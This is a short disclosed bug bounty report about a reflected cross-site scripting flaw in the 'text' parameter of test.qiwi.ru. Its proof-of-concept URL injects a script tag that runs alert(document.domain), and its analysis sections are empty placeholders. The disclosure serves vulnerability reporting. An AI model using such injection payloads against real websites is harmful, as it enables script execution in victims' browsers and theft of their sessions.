---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '98281'
original_report_id: '98281'
title: XSS Reflected in test.qiwi.ru
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2015-11-06T16:16:12.872Z'
disclosed_at: '2015-12-11T17:12:28.995Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS Reflected in test.qiwi.ru

## Metadata

- HackerOne Report ID: 98281
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2015-12-11T17:12:28.995Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Dear Qiwi Team,
 
Please find below link for POC for XSS vulnerability discovered in your website.

Vulnerable Parameter: text

Link : http://test.qiwi.ru/about/what/?purse=on&region=0&terminals=on&text=1'"()%26%25<acx><ScRiPt >alert(document.domain)</ScRiPt>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
